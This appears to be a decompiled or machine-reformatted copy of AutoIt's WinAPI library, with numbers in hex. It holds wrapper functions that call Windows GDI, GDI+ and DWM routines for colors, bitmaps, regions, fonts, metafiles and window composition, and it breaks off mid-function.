    Func _WinAPI_ColorAdjustLuma($irgb, $ipercent, $bscale = True)
        If $irgb = + -1 Then Return SetError(0xa, 0x0, + -1)
        If $bscale Then
            $ipercent = Floor($ipercent * 0xa)
        EndIf
        Local $acall = DllCall("shlwapi.dll", "dword", "ColorAdjustLuma", "dword", __rgb($irgb), "int", $ipercent, "bool", $bscale)
        If @error Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_ColorAdjustLuma

    Func _WinAPI_ColorHLSToRGB($ihue, $iluminance, $isaturation)
        If Not $isaturation Then $ihue = 0xa0
        Local $acall = DllCall("shlwapi.dll", "dword", "ColorHLSToRGB", "word", $ihue, "word", $iluminance, "word", $isaturation)
        If @error Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_ColorHLSToRGB

    Func _WinAPI_ColorRGBToHLS($irgb, ByRef $ihue, ByRef $iluminance, ByRef $isaturation)
        Local $acall = DllCall("shlwapi.dll", "none", "ColorRGBToHLS", "dword", __rgb($irgb), "word*", 0x0, "word*", 0x0, "word*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        $ihue = $acall[0x2]
        $iluminance = $acall[0x3]
        $isaturation = $acall[0x4]
        Return 0x1
    EndFunc    ; -> _WinAPI_ColorRGBToHLS

    Func _WinAPI_CombineTransform($txform1, $txform2)
        Local $txform = DllStructCreate($TAGXFORM)
        Local $acall = DllCall("gdi32.dll", "bool", "CombineTransform", "struct*", $txform, "struct*", $txform1, "struct*", $txform2)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $txform
    EndFunc    ; -> _WinAPI_CombineTransform

    Func _WinAPI_CompressBitmapBits($hbitmap, ByRef $pbuffer, $icompression = 0x0, $iquality = 0x64)
        If Not __dll("gdiplus.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $asize[0x2], $icount, $iformat, $ilength, $smime, $acall, $hdc, $hsv, $hmem, $tbits, $tdata, $pdata, $ierror = 0x1
        Local $hsource = 0x0, $himage = 0x0, $htoken = 0x0, $pstream = 0x0, $tparam = 0x0
        Local $tdib = DllStructCreate($TAGDIBSECTION)
        Do
            Switch $icompression
            Case 0x0
                $smime = "image/png"
            Case 0x1
                $smime = "image/jpeg"
            Case Else
                $ierror = 0xa
                ExitLoop
            EndSwitch
            While $hbitmap
                If Not _WinAPI_GetObject($hbitmap, DllStructGetSize($tdib), $tdib) Then
                    $ierror = 0xb
                    ExitLoop 0x2
                EndIf
                If (DllStructGetData($tdib, "bmBitsPixel") = 0x20) And (Not DllStructGetData($tdib, "biCompression")) Then
                    $ierror = 0xc
                    ExitLoop
                EndIf
                If $hsource Then
                    $ierror = 0xd
                    ExitLoop 0x2
                EndIf
                $hsource = _WinAPI_CreateDIB(DllStructGetData($tdib, "bmWidth"), DllStructGetData($tdib, "bmHeight"))
                If Not $hsource Then
                    $ierror = @error + 0x64
                    ExitLoop 0x2
                EndIf
                $hdc = _WinAPI_CreateCompatibleDC(0x0)
                $hsv = _WinAPI_SelectObject($hdc, $hsource)
                If _WinAPI_DrawBitmap($hdc, 0x0, 0x0, $hbitmap) Then
                    $hbitmap = $hsource
                Else
                    $ierror = @error + 0xc8
                    $hbitmap = 0x0
                EndIf
                _WinAPI_SelectObject($hdc, $hsv)
                _WinAPI_DeleteDC($hdc)
            WEnd
            If Not $hbitmap Then
                ExitLoop
            EndIf
            For $i = 0x0 To 0x1
                $asize[$i] = DllStructGetData($tdib, $i + 0x2)
            Next
            $tbits = DllStructCreate("byte[" & ($asize[0x0] * $asize[0x1] * 0x4) & "]")
            If Not _WinAPI_GetBitmapBits($hbitmap, DllStructGetSize($tbits), $tbits) Then
                $ierror = @error + 0x12c
                ExitLoop
            EndIf
            $tdata = DllStructCreate($TAGGDIPSTARTUPINPUT)
            DllStructSetData($tdata, "Version", 0x1)
            $acall = DllCall("gdiplus.dll", "int", "GdiplusStartup", "ulong_ptr*", 0x0, "struct*", $tdata, "ptr", 0x0)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x190
                ExitLoop
            EndIf
            If _WinAPI_IsAlphaBitmap($hbitmap) Then
                $iformat = 0x26200a
            Else
                $iformat = 0x22009
            EndIf
            $htoken = $acall[0x1]
            $acall = DllCall("gdiplus.dll", "int", "GdipCreateBitmapFromScan0", "int", $asize[0x0], "int", $asize[0x1], "uint", $asize[0x0] * 0x4, "int", $iformat, "struct*", $tbits, "ptr*", 0x0)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x1f4
                ExitLoop
            EndIf
            $himage = $acall[0x6]
            $acall = DllCall("gdiplus.dll", "int", "GdipGetImageEncodersSize", "uint*", 0x0, "uint*", 0x0)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x258
                ExitLoop
            EndIf
            $icount = $acall[0x1]
            $tdata = DllStructCreate("byte[" & $acall[0x2] & "]")
            If @error Then
                $ierror = @error + 0x2bc
                ExitLoop
            EndIf
            $pdata = DllStructGetPtr($tdata)
            $acall = DllCall("gdiplus.dll", "int", "GdipGetImageEncoders", "uint", $icount, "uint", $acall[0x2], "struct*", $tdata)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x320
                ExitLoop
            EndIf
            Local $tcodec, $pencoder = 0x0
            For $i = 0x1 To $icount
                $tcodec = DllStructCreate($TAGGDIPIMAGECODECINFO, $pdata)
                If Not StringInStr(_WinAPI_GetString(DllStructGetData($tcodec, "MimeType")), $smime) Then
                    $pdata += DllStructGetSize($TAGGDIPIMAGECODECINFO)
                Else
                    $pencoder = $pdata
                    $ierror = 0x0
                    ExitLoop
                EndIf
            Next
            If Not $pencoder Then
                $ierror = 0xf
                ExitLoop
            EndIf
            Switch $icompression
            Case 0x0
            Case 0x1
                Local Const $TAGENCODERPARAMETER = "byte[16] GUID;ulong NumberOfValues;dword Type;ptr pValue"
                $tparam = DllStructCreate("dword Count;" & $TAGENCODERPARAMETER & ";ulong Quality")
                DllStructSetData($tparam, "Count", 0x1)
                DllStructSetData($tparam, "NumberOfValues", 0x1)
                DllStructSetData($tparam, "Type", 0x4)
                DllStructSetData($tparam, "pValue", DllStructGetPtr($tparam, "Quality"))
                DllStructSetData($tparam, "Quality", $iquality)
                $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}", "ptr", DllStructGetPtr($tparam, 0x2))
                If @error Or $acall[0x0] Then
                    $tparam = 0x0
                EndIf
            EndSwitch
            $pstream = _WinAPI_CreateStreamOnHGlobal()
            $acall = DllCall("gdiplus.dll", "int", "GdipSaveImageToStream", "handle", $himage, "ptr", $pstream, "ptr", $pencoder, "struct*", $tparam)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x384
                ExitLoop
            EndIf
            $hmem = _WinAPI_GetHGlobalFromStream($pstream)
            $acall = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x3e8
                ExitLoop
            EndIf
            $ilength = $acall[0x0]
            $acall = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x44c
                ExitLoop
            EndIf
            $pbuffer = __HeapReAlloc($pbuffer, $ilength, 0x1)
            If Not @error Then
                _WinAPI_MoveMemory($pbuffer, $acall[0x0], $ilength)
            Else
                $ierror = @error + 0x514
            EndIf
        Until 0x1
        If $pstream Then
            _WinAPI_ReleaseStream($pstream)
        EndIf
        If $himage Then
            DllCall("gdiplus.dll", "int", "GdipDisposeImage", "handle", $himage)
        EndIf
        If $htoken Then
            DllCall("gdiplus.dll", "none", "GdiplusShutdown", "ulong_ptr", $htoken)
        EndIf
        If $hsource Then
            _WinAPI_DeleteObject($hsource)
        EndIf
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $ilength
    EndFunc    ; -> _WinAPI_CompressBitmapBits

    Func _WinAPI_CopyEnhMetaFile($hemf, $sfilepath = '')
        If Not StringStripWS($sfilepath, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sfilepath = Null
        Local $acall = DllCall("gdi32.dll", "handle", "CopyEnhMetaFileW", "handle", $hemf, "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CopyEnhMetaFile

    Func _WinAPI_CopyRect($trect)
        Local $tdata = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "CopyRect", "struct*", $tdata, "struct*", $trect)
        If @error Or Not $acall[0x0] Then SetError(@error + 0xa, @extended, 0x0)
        Return $tdata
    EndFunc    ; -> _WinAPI_CopyRect

    Func _WinAPI_Create32BitHBITMAP($hicon, $bdib = False, $bdelete = False)
        Local $hbitmap = 0x0
        Local $adib[0x2] = [0x0, 0x0]
        Local $htemp = _WinAPI_Create32BitHICON($hicon)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $ierror = 0x0
        Do
            Local $ticoninfo = DllStructCreate($TAGICONINFO)
            Local $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $htemp, "struct*", $ticoninfo)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            For $i = 0x0 To 0x1
                $adib[$i] = DllStructGetData($ticoninfo, $i + 0x4)
            Next
            Local $tbitmap = DllStructCreate($TAGBITMAP)
            If Not _WinAPI_GetObject($adib[0x0], DllStructGetSize($tbitmap), $tbitmap) Then
                $ierror = @error + 0x14
                ExitLoop
            EndIf
            If $bdib Then
                $hbitmap = _WinAPI_CreateDIB(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"))
                Local $hdc = _WinAPI_CreateCompatibleDC(0x0)
                Local $hsv = _WinAPI_SelectObject($hdc, $hbitmap)
                _WinAPI_DrawIconEx($hdc, 0x0, 0x0, $htemp)
                _WinAPI_SelectObject($hdc, $hsv)
                _WinAPI_DeleteDC($hdc)
            Else
                $hbitmap = $adib[0x1]
                $adib[0x1] = 0x0
            EndIf
        Until 0x1
        For $i = 0x0 To 0x1
            If $adib[$i] Then
                _WinAPI_DeleteObject($adib[$i])
            EndIf
        Next
        _WinAPI_DestroyIcon($htemp)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        If Not $hbitmap Then Return SetError(0xc, 0x0, 0x0)
        If $bdelete Then
            _WinAPI_DestroyIcon($hicon)
        EndIf
        Return $hbitmap
    EndFunc    ; -> _WinAPI_Create32BitHBITMAP

    Func _WinAPI_CreateBitmapIndirect(ByRef $tbitmap)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateBitmapIndirect", "struct*", $tbitmap)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateBitmapIndirect

    Func _WinAPI_CreateBrushIndirect($istyle, $irgb, $ihatch = 0x0)
        Local $tlogbrush = DllStructCreate($TAGLOGBRUSH)
        DllStructSetData($tlogbrush, 0x1, $istyle)
        DllStructSetData($tlogbrush, 0x2, __rgb($irgb))
        DllStructSetData($tlogbrush, 0x3, $ihatch)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateBrushIndirect", "struct*", $tlogbrush)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateBrushIndirect

    Func _WinAPI_CreateColorAdjustment($iflags = 0x0, $iilluminant = 0x0, $igammar = 0x2710, $igammag = 0x2710, $igammab = 0x2710, $iblack = 0x0, $iwhite = 0x2710, $icontrast = 0x0, $ibrightness = 0x0, $icolorfulness = 0x0, $itint = 0x0)
        Local $tca = DllStructCreate($TAGCOLORADJUSTMENT)
        DllStructSetData($tca, 0x1, DllStructGetSize($tca))
        DllStructSetData($tca, 0x2, $iflags)
        DllStructSetData($tca, 0x3, $iilluminant)
        DllStructSetData($tca, 0x4, $igammar)
        DllStructSetData($tca, 0x5, $igammag)
        DllStructSetData($tca, 0x6, $igammab)
        DllStructSetData($tca, 0x7, $iblack)
        DllStructSetData($tca, 0x8, $iwhite)
        DllStructSetData($tca, 0x9, $icontrast)
        DllStructSetData($tca, 0xa, $ibrightness)
        DllStructSetData($tca, 0xb, $icolorfulness)
        DllStructSetData($tca, 0xc, $itint)
        Return $tca
    EndFunc    ; -> _WinAPI_CreateColorAdjustment

    Func _WinAPI_CreateCompatibleBitmapEx($hdc, $iwidth, $iheight, $irgb)
        Local $hbrush = _WinAPI_CreateBrushIndirect(0x0, $irgb)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
        Local $hdestdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
        Local $hbmp = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
        Local $hdestsv = $acall[0x0]
        Local $trect = _WinAPI_CreateRectEx(0x0, 0x0, $iwidth, $iheight)
        Local $ierror = 0x0
        $acall = DllCall("user32.dll", "int", "FillRect", "handle", $hdestdc, "struct*", $trect, "handle", $hbrush)
        If @error Or Not $acall[0x0] Then
            $ierror = @error + 0xa
            _WinAPI_DeleteObject($hbmp)
        EndIf
        _WinAPI_DeleteObject($hbrush)
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
        DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $hbmp
    EndFunc    ; -> _WinAPI_CreateCompatibleBitmapEx

    Func _WinAPI_CreateDIBitmap($hdc, ByRef $tbitmapinfo, $iusage, $pbits = 0x0)
        Local $iinit = 0x0
        If $pbits Then
            $iinit = 0x4
        EndIf
        Local $acall = DllCall("gdi32.dll", "handle", "CreateDIBitmap", "handle", $hdc, "struct*", $tbitmapinfo, "dword", $iinit, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateDIBitmap

    Func _WinAPI_CreateEllipticRgn($trect)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateEllipticRgnIndirect", "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateEllipticRgn

    Func _WinAPI_CreateEnhMetaFile($hdc = 0x0, $trect = 0x0, $bpixels = False, $sfilepath = '', $sdescription = '')
        If Not StringStripWS($sfilepath, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sfilepath = Null
        Local $tdata = 0x0, $ADATA = StringSplit($sdescription, "|", $STR_NOCOUNT)
        If UBound($ADATA) < 0x2 Then
            ReDim $ADATA[0x2]
            $ADATA[0x1] = ''
        EndIf
        For $i = 0x0 To 0x1
            $ADATA[$i] = StringStripWS($ADATA[$i], $STR_STRIPLEADING + $STR_STRIPTRAILING)
        Next
        If ($ADATA[0x0]) Or ($ADATA[0x1]) Then
            $tdata = _WinAPI_ArrayToStruct($ADATA)
        EndIf
        Local $ixp, $iyp, $ixm, $iym, $href = 0x0
        If $bpixels And (IsDllStruct($trect)) Then
            If Not $hdc Then
                $href = _WinAPI_GetDC(0x0)
            EndIf
            $ixp = _WinAPI_GetDeviceCaps($href, 0x8)
            $iyp = _WinAPI_GetDeviceCaps($href, 0xa)
            $ixm = _WinAPI_GetDeviceCaps($href, 0x4)
            $iym = _WinAPI_GetDeviceCaps($href, 0x6)
            If $href Then
                _WinAPI_ReleaseDC(0x0, $href)
            EndIf
            For $i = 0x1 To 0x3 Step 0x2
                DllStructSetData($trect, $i, Round(DllStructGetData($trect, $i) * $ixm / $ixp * 0x64))
            Next
            For $i = 0x2 To 0x4 Step 0x2
                DllStructSetData($trect, $i, Round(DllStructGetData($trect, $i) * $iym / $iyp * 0x64))
            Next
        EndIf
        Local $acall = DllCall("gdi32.dll", "handle", "CreateEnhMetaFileW", "handle", $hdc, "wstr", $sfilepath, "struct*", $trect, "struct*", $tdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateEnhMetaFile

    Func _WinAPI_CreateFontEx($iheight, $iwidth = 0x0, $iescapement = 0x0, $iorientation = 0x0, $iweight = 0x190, $bitalic = False, $bunderline = False, $bstrikeout = False, $icharset = 0x1, $ioutprecision = 0x0, $iclipprecision = 0x0, $iquality = 0x0, $ipitchandfamily = 0x0, $sfacename = '', $istyle = 0x0)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescapement, "int", $iorientation, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutprecision, "dword", $iclipprecision, "dword", $iquality, "dword", $ipitchandfamily, "wstr", _WinAPI_GetFontName($sfacename, $istyle, $icharset))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateFontEx

    Func _WinAPI_CreateNullRgn()
        Local $acall = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", 0x0, "int", 0x0, "int", 0x0, "int", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateNullRgn

    Func _WinAPI_CreatePen($ipenstyle, $iwidth, $icolor)
        Local $acall = DllCall("gdi32.dll", "handle", "CreatePen", "int", $ipenstyle, "int", $iwidth, "INT", $icolor)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreatePen

    Func _WinAPI_CreatePolygonRgn(Const ByRef $APOINT, $ISTART = 0x0, $IEND = + -1, $imode = 0x1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2, 0x2) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "int[2];"
        Next
        Local $tdata = DllStructCreate($tagstruct)
        Local $icount = 0x1
        For $i = $ISTART To $IEND
            For $j = 0x0 To 0x1
                DllStructSetData($tdata, $icount, $APOINT[$i][$j], $j + 0x1)
            Next
            $icount += 0x1
        Next
        Local $acall = DllCall("gdi32.dll", "handle", "CreatePolygonRgn", "struct*", $tdata, "int", $icount + -1, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreatePolygonRgn

    Func _WinAPI_CreateRectRgnIndirect($trect)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateRectRgnIndirect", "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateRectRgnIndirect

    Func _WinAPI_CreateSolidBitmap($hwnd, $icolor, $iwidth, $iheight, $brgb = 0x1)
        Local $hdc = _WinAPI_GetDC($hwnd)
        Local $hdestdc = _WinAPI_CreateCompatibleDC($hdc)
        Local $hbitmap = _WinAPI_CreateCompatibleBitmap($hdc, $iwidth, $iheight)
        Local $hold = _WinAPI_SelectObject($hdestdc, $hbitmap)
        Local $trect = DllStructCreate($TAGRECT)
        DllStructSetData($trect, 0x1, 0x0)
        DllStructSetData($trect, 0x2, 0x0)
        DllStructSetData($trect, 0x3, $iwidth)
        DllStructSetData($trect, 0x4, $iheight)
        If $brgb Then
            $icolor = BitOR(BitAND($icolor, 0xff00), BitShift(BitAND($icolor, 0xff), + -16), BitShift(BitAND($icolor, 0xff0000), 0x10))
        EndIf
        Local $hbrush = _WinAPI_CreateSolidBrush($icolor)
        If Not _WinAPI_FillRect($hdestdc, $trect, $hbrush) Then
            _WinAPI_DeleteObject($hbitmap)
            $hbitmap = 0x0
        EndIf
        _WinAPI_DeleteObject($hbrush)
        _WinAPI_ReleaseDC($hwnd, $hdc)
        _WinAPI_SelectObject($hdestdc, $hold)
        _WinAPI_DeleteDC($hdestdc)
        If Not $hbitmap Then Return SetError(0x1, 0x0, 0x0)
        Return $hbitmap
    EndFunc    ; -> _WinAPI_CreateSolidBitmap

    Func _WinAPI_CreateTransform($nm11 = 0x1, $nm12 = 0x0, $nm21 = 0x0, $nm22 = 0x1, $ndx = 0x0, $ndy = 0x0)
        Local $txform = DllStructCreate($TAGXFORM)
        DllStructSetData($txform, 0x1, $nm11)
        DllStructSetData($txform, 0x2, $nm12)
        DllStructSetData($txform, 0x3, $nm21)
        DllStructSetData($txform, 0x4, $nm22)
        DllStructSetData($txform, 0x5, $ndx)
        DllStructSetData($txform, 0x6, $ndy)
        Return $txform
    EndFunc    ; -> _WinAPI_CreateTransform

    Func _WinAPI_DeleteEnhMetaFile($hemf)
        Local $acall = DllCall("gdi32.dll", "bool", "DeleteEnhMetaFile", "handle", $hemf)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeleteEnhMetaFile

    Func _WinAPI_DPtoLP($hdc, ByRef $tpoint, $icount = 0x1)
        Local $acall = DllCall("gdi32.dll", "bool", "DPtoLP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DPtoLP

    Func _WinAPI_DrawAnimatedRects($hwnd, $trectfrom, $trectto)
        Local $acall = DllCall("user32.dll", "bool", "DrawAnimatedRects", "hwnd", $hwnd, "int", 0x3, "struct*", $trectfrom, "struct*", $trectto)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawAnimatedRects

    Func _WinAPI_DrawBitmap($hdc, $ix, $iy, $hbitmap, $irop = 0xcc0020)
        Local $tobj = DllStructCreate($TAGBITMAP)
        Local $acall = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", 0x0)
        Local $_hdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $_hdc)
        Local $hsrcdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
        Local $hsrcsv = $acall[0x0]
        Local $ierror = 0x0
        $acall = DllCall("gdi32.dll", "int", "BitBlt", "hwnd", $hdc, "int", $ix, "int", $iy, "int", DllStructGetData($tobj, "bmWidth"), "int", DllStructGetData($tobj, "bmHeight"), "hwnd", $hsrcdc, "int", 0x0, "int", 0x0, "int", $irop)
        If @error Or Not $acall[0x0] Then
            $ierror = @error + 0x1
        EndIf
        DllCall("user32.dll", "int", "ReleaseDC", "hwnd", 0x0, "handle", $_hdc)
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
        DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
        If $ierror Then Return SetError(0xa, 0x0, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DrawBitmap

    Func _WinAPI_DrawFocusRect($hdc, $trect)
        Local $acall = DllCall("user32.dll", "bool", "DrawFocusRect", "handle", $hdc, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawFocusRect

    Func _WinAPI_DrawLine($hdc, $ix1, $iy1, $ix2, $iy2)
        _WinAPI_MoveTo($hdc, $ix1, $iy1)
        If @error Then Return SetError(@error, @extended, False)
        _WinAPI_LineTo($hdc, $ix2, $iy2)
        If @error Then Return SetError(@error + 0xa, @extended, False)
        Return True
    EndFunc    ; -> _WinAPI_DrawLine

    Func _WinAPI_DrawShadowText($hdc, $stext, $irgbtext, $irgbshadow, $ixoffset = 0x0, $iyoffset = 0x0, $trect = 0x0, $iflags = 0x0)
        Local $acall
        If Not IsDllStruct($trect) Then
            $trect = DllStructCreate($TAGRECT)
            $acall = DllCall("user32.dll", "bool", "GetClientRect", "hwnd", _WinAPI_WindowFromDC($hdc), "struct*", $trect)
            If @error Then Return SetError(@error + 0xa, @extended, 0x0)
            If Not $acall[0x0] Then Return SetError(0xa, 0x0, 0x0)
        EndIf
        $acall = DllCall("comctl32.dll", "int", "DrawShadowText", "handle", $hdc, "wstr", $stext, "uint", + -1, "struct*", $trect, "dword", $iflags, "int", __rgb($irgbtext), "int", __rgb($irgbshadow), "int", $ixoffset, "int", $iyoffset)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawShadowText

    Func _WinAPI_DwmDefWindowProc($hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("dwmapi.dll", "bool", "DwmDefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam, "lresult*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_DwmDefWindowProc

    Func _WinAPI_DwmEnableBlurBehindWindow($hwnd, $benable = True, $btransition = False, $hrgn = 0x0)
        Local $tblurbehind = DllStructCreate("dword;bool;handle;bool")
        Local $iflags = 0x0
        If $hrgn Then
            $iflags += 0x2
            DllStructSetData($tblurbehind, 0x3, $hrgn)
        EndIf
        DllStructSetData($tblurbehind, 0x1, BitOR($iflags, 0x5))
        DllStructSetData($tblurbehind, 0x2, $benable)
        DllStructSetData($tblurbehind, 0x4, $btransition)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmEnableBlurBehindWindow", "hwnd", $hwnd, "struct*", $tblurbehind)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmEnableBlurBehindWindow

    Func _WinAPI_DwmEnableComposition($benable)
        If $benable Then $benable = 0x1
        Local $acall = DllCall("dwmapi.dll", "long", "DwmEnableComposition", "uint", $benable)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmEnableComposition

    Func _WinAPI_DwmExtendFrameIntoClientArea($hwnd, $tmargins = 0x0)
        If Not IsDllStruct($tmargins) Then
            $tmargins = _WinAPI_CreateMargins(+ -1, + -1, + -1, + -1)
        EndIf
        Local $acall = DllCall("dwmapi.dll", "long", "DwmExtendFrameIntoClientArea", "hwnd", $hwnd, "struct*", $tmargins)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmExtendFrameIntoClientArea

    Func _WinAPI_DwmGetColorizationColor()
        Local $acall = DllCall("dwmapi.dll", "long", "DwmGetColorizationColor", "dword*", 0x0, "bool*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return SetExtended($acall[0x2], $acall[0x1])
    EndFunc    ; -> _WinAPI_DwmGetColorizationColor

    Func _WinAPI_DwmGetColorizationParameters()
        Local $tdwmcp = DllStructCreate($TAGDWM_COLORIZATION_PARAMETERS)
        Local $acall = DllCall("dwmapi.dll", "uint", 0x7f, "struct*", $tdwmcp)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $tdwmcp
    EndFunc    ; -> _WinAPI_DwmGetColorizationParameters

    Func _WinAPI_DwmGetWindowAttribute($hwnd, $iattribute)
        Local $tagstruct
        Switch $iattribute
        Case 0x5, 0x9
            $tagstruct = $TAGRECT
        Case 0x1
            $tagstruct = "uint"
        Case Else
            Return SetError(0xb, 0x0, 0x0)
        EndSwitch
        Local $tdata = DllStructCreate($tagstruct)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "struct*", $tdata, "dword", DllStructGetSize($tdata))
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Switch $iattribute
        Case 0x1
            Return DllStructGetData($tdata, 0x1)
        Case Else
            Return $tdata
        EndSwitch
    EndFunc    ; -> _WinAPI_DwmGetWindowAttribute

    Func _WinAPI_DwmInvalidateIconicBitmaps($hwnd)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmInvalidateIconicBitmaps", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmInvalidateIconicBitmaps

    Func _WinAPI_DwmIsCompositionEnabled()
        Local $acall = DllCall("dwmapi.dll", "long", "DwmIsCompositionEnabled", "bool*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_DwmIsCompositionEnabled

    Func _WinAPI_DwmQueryThumbnailSourceSize($hthumbnail)
        Local $tsize = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmQueryThumbnailSourceSize", "handle", $hthumbnail, "struct*", $tsize)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $tsize
